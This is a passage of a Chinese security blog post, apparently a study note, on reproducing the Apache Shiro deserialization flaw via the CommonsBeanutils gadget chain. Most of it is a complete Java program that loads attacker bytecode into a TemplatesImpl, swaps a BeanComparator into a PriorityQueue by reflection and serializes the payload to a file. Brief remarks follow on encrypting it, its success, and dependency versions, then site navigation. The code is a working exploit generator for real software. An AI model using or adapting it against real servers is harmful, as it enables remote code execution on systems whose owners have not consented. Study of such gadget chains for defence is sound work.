+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span> codes[][]= &#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line">        <span class="comment">//CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//cc2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue= <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//AbstractMapDecorator</span></span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="comment">//Hashtable</span></span><br><span class="line">        <span class="comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        写对象，序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        读对象，反序列化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接加密生成下</p>
+<p>可以看到是成功了的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031547908.png" alt="image-20220403154755741"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apsry/ysoserial/tree/master/src/main/java/ysoserial">ysoserial的CB链</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031549167.png" alt="image-20220403154914046"></p>
+<p>他里面代码的依赖是</p>
+<p><code>commons-beanutils:commons-beanutils:1.9.2</code></p>
+<p>而shiro里面的版本是1.8.3，所以我们需要改依赖才能打，否则会报错</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#823652d0">https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#823652d0</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B">https://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%87(CC2+CC4+CC5+CC7)/" rel="prev" title="java(CC2+CC4+CC5+CC7)分析">
+      <i class="fa fa-chevron-left"></i> java(CC2+CC4+CC5+CC7)分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E6%97%B6shiro-%E5%B7%B2%E5%A1%AB%E5%9D%91"><span class="nav-text">初时shiro(已填坑)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsCollections%E7%A4%BA%E4%BE%8B"><span class="nav-text">CommonsCollections示例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-1"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">复现</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsBeanutils"><span class="nav-text">CommonsBeanutils</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-2"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">复现</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
